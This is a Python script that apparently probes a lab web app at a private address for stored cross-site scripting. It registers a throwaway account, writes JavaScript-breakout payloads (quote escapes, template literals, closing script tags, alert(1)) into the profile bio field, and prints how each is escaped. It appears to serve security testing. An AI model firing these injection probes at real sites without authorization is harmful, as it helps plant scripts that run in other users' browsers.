import requests, re, random, string

BASE = "http://10.112.165.127:5000"

uname = "jstest_" + "".join(random.choices(string.ascii_lowercase, k=4))
s = requests.Session()
s.post(f"{BASE}/register", data={"username": uname, "password": "Test1234!"}, allow_redirects=False)
s.post(f"{BASE}/login", data={"username": uname, "password": "Test1234!"}, allow_redirects=False)

# Test 1: Can we break out of JS string with a double quote?
test_bio = 'AAA";var x=1;//BBB'

s.post(f"{BASE}/complete_profile", data={
    "real_name": "Normal",
    "email": "test@test.com",
    "phone": "123",
    "address": "Normal",
    "bio": test_bio,
}, allow_redirects=False)

r = s.get(f"{BASE}/profile/{uname}")
# Find the JS context
idx = r.text.find("bioText")
if idx >= 0:
    snippet = r.text[idx:idx+200]
    print(f"[Test 1] Quote break test:")
    print(f"  {snippet}")
    # Check if quote was escaped
    if 'AAA";var x=1;//BBB' in r.text:
        print("  --> QUOTE NOT ESCAPED! JS injection possible!")
    elif 'AAA\\";var x=1;//BBB' in r.text:
        print("  --> Quote escaped with backslash")
    elif 'AAA&quot;' in r.text:
        print("  --> Quote HTML-entity escaped")
    else:
        print("  --> Other escaping")

# Test 2: Try with backslash escape bypass
test_bio2 = 'AAA\\";var y=2;//BBB'
s.post(f"{BASE}/my_profile", data={
    "real_name": "Normal",
    "email": "test@test.com",
    "phone": "123",
    "address": "Normal",
    "bio": test_bio2,
}, allow_redirects=False)

r2 = s.get(f"{BASE}/profile/{uname}")
idx2 = r2.text.find("bioText")
if idx2 >= 0:
    snippet2 = r2.text[idx2:idx2+200]
    print(f"\n[Test 2] Backslash bypass test:")
    print(f"  {snippet2}")

# Test 3: Template literal / other JS escapes
for i, payload in enumerate([
    "AAA`+alert(1)+`BBB",          # template literal
    "AAA</script><script>alert(1)</script>",  # close script tag
    "AAA\x3c/script\x3e",          # hex encoded
    "AAA'-alert(1)-'BBB",          # single quote
], start=3):
    s.post(f"{BASE}/my_profile", data={
        "real_name": "Normal",
        "email": "test@test.com",
        "phone": "123",
        "address": "Normal",
        "bio": payload,
    }, allow_redirects=False)
    r = s.get(f"{BASE}/profile/{uname}")
    idx = r.text.find("bioText")
    if idx >= 0:
        snippet = r.text[idx:idx+200]
        print(f"\n[Test {i}] Payload: {repr(payload)}")
        print(f"  {snippet}")

# Show more context around bioText to understand the full script block
print("\n=== Full script context ===")
r = s.get(f"{BASE}/profile/{uname}")
idx = r.text.find("bioText")
if idx >= 0:
    # Find script tag
    script_start = r.text.rfind("<script", 0, idx)
    script_end = r.text.find("</script>", idx)
    if script_start >= 0 and script_end >= 0:
        print(r.text[script_start:script_end+9])

print(f"\nUsername: {uname}")
